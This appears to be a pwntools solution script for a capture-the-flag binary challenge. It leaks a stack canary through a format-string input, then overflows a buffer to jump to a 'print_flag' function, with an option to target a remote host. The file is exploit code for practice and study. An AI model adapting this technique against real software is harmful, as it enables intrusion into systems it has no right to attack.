from pwn import *

elf = context.binary = ELF('./task')
rop = ROP(elf.path)
RET = (rop.find_gadget(['ret']))[0]

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *vuln+73",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


p.sendlineafter(b'First: ', b"%9$lx")
canary = p.recvuntil(b'Second', drop=True).strip().decode()
canary = int(canary, 16)
print(f"Canary: {hex(canary)}")

payload = b'A' * 24
payload += p64(canary)
payload += b'FAKE_RBP'
payload += p64(RET)
payload += p64(elf.symbols['print_flag'])

if b'\x0a' in payload:
	print("Repeat, banned char")
	exit(1)

p.sendline(payload)

print(p.clean(1.0))
